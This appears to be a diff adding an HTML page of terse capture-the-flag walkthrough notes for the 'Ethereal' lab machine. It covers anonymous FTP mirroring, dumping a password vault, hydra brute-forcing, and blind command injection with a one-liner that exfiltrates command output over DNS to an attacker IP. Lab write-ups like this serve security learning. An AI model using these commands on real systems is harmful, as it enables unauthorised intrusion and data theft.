@@ -1,0 +1,56 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Ethereal - Blind CMDi DNS Exfil OpenSSL MSI Exec</title>
+</head><body>Tough<br/>
+Blind cmd inject &gt; exfil over DNS<br/>
+Openssl to get a shell due to restrictive firewall<br/>
+sign MSI and exec for system shell<br/>
+<br/>
+anonymous access to ftp<br/>
+wget -m --no-passive-ftp ftp://anonymous:anonymous@&lt;IP&gt;<br/>
+<br/>
+Assistance.aspx page lets us send a message (optional)<br/>
+corp/login/default.aspx we see no requests in Burp intercept...<br/>
+&nbsp;&#09;Login maybe not implemented OR<br/>
+&nbsp;&#09;Javascript authentication not doing anything (immediate failures)<br/>
+cop/console/note/index.html<br/>
+corp/console/desktop/default.aspx &#09;Looks like a vdi only displaying images, no actual interactivity<br/>
+corp/console/ping, goes to ethereal<br/>
+<br/>
+Add <br/>
+ethereal and ethereal.htb to hosts file for virtual host routing<br/>
+<br/>
+ethereal.htb:8080 now gives us a login prompt<br/>
+<br/>
+Look at files obtained, orca.msi looks interesting, but it's incredibly old. Msi used to contain credentials, but nothing here. <br/>
+Unzip the zip archives DISK1, DISK2, FDISK<br/>
+strings and see PasswordBox<br/>
+PasswordBox is an open source password manager<br/>
+mkdir /mnt/{DISK1,DISK2,FDISK}<br/>
+mount DISK1 /mnt/DISK1<br/>
+mount DISK2 /mnt/DISK2<br/>
+mount FDISK /mnt/FDISK<br/>
+<br/>
+In FDISK, pbox.dat and pbox.exe<br/>
+<br/>
+find the linux version on sourceforge<br/>
+Needs 32-bit libcurses5<br/>
+apt install libncurses5:i386<br/>
+<br/>
+copy the pbox.dat to /root/.pbox.dat and now running pbox will ask you for the master password to open it<br/>
+guess "password" and unlock the vault<br/>
+./pbox --dump<br/>
+<br/>
+hydra and brute force the login page for ethereal.htb:8080<br/>
+<br/>
+Test connection, the classic 'cmd inject me' ctf exercise<br/>
+confirm injection by passing -n 1 and -n 2 and see the change in response<br/>
+<br/>
+exfil in cmd inject<br/>
+for /f %a in ('whoami') do (nslookup %a &lt;ip&gt;)<br/>
+<br/>
+scripting cmd in linux<br/>
+for /f "tokens=1,2,3,4,5,6" %a in ('dir') do (echo %a%b%c%d%e%f)<br/>
+</body></html>
